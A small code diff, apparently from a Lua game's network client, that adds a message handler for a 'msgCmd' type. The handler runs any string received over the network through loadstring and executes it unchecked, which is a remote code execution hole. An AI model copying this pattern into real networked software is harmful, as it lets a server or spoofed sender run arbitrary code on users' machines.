@@ -32,6 +32,11 @@ function NetClient:send()
 end
 
 NetClient.messageHandlers = {
+  [Net.msgCmd] = function(self, stream)
+    local str = stream:read('')
+    loadstring(str)()
+  end,
+  
   [Net.msgJoin] = function(self, stream)
     if not myId then
       myId, tick = stream:read(4, 16)
